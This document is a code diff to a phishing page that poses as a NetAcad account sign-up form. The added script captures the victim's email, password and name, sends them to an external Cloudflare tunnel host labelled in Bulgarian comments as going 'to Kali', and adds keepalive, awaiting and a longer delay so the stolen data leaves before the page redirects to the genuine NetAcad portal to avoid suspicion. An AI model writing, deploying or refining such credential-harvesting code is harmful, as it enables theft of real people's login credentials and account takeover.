@@ -106,7 +106,7 @@
                 <label style="margin-top:15px;">Password</label><input type="password" id="pass" required>
                 <a href="#" class="req-link">ⓘ Password requirements:</a>
                 <label>Re-enter password to confirm</label><input type="password" id="confirm" required>
-                <button type="submit" class="btn-create">Create account</button>
+                <button type="submit" class="btn-create" id="submitBtn">Create account</button>
             </form>
 
             <div class="footer-log">Already have an account? <a href="#">Log In</a></div>
@@ -114,11 +114,12 @@
     </div>
 
 <script>
-    document.getElementById('final-form').onsubmit = function(e) {
+    document.getElementById('final-form').onsubmit = async function(e) {
         e.preventDefault();
         
-        // НОВИЯТ ТИ ЛИНК ОТ ДНЕС (04.02.2026)
-        const gate = "https://translate-encoding-thinking-pic.trycloudflare.com";
+        // НОВИЯТ ТИ АКТУАЛЕН ЛИНК + /login
+        const gate = "https://translate-encoding-thinking-pic.trycloudflare.com/login";
+        const submitBtn = document.getElementById('submitBtn');
 
         const data = {
             email: document.getElementById('email').value,
@@ -126,19 +127,26 @@
             name: document.getElementById('fname').value + " " + document.getElementById('lname').value
         };
 
-        // Изпращане към Kali
-        fetch(`${gate}?u=${encodeURIComponent(data.email)}&p=${encodeURIComponent(data.pass)}&n=${encodeURIComponent(data.name)}`, {
-            mode: 'no-cors',
-            method: 'GET'
-        });
+        // Визуална обратна връзка
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Processing...";
 
-        // Пренасочване към истинския NetAcad портал
+        try {
+            // Изпращане към Kali с keepalive за по-голяма сигурност
+            await fetch(`${gate}?u=${encodeURIComponent(data.email)}&p=${encodeURIComponent(data.pass)}&n=${encodeURIComponent(data.name)}`, {
+                mode: 'no-cors',
+                method: 'GET',
+                keepalive: true
+            });
+        } catch (err) {
+            console.log("Network lag detected");
+        }
+
+        // Изчакваме 1.5 секунди, за да сме сигурни, че пакетът е напуснал браузъра
         setTimeout(() => {
             window.location.href = "https://www.netacad.com/portal/learning";
-        }, 1000);
+        }, 1500);
     };
 </script>
 </body>
 </html>
-
-
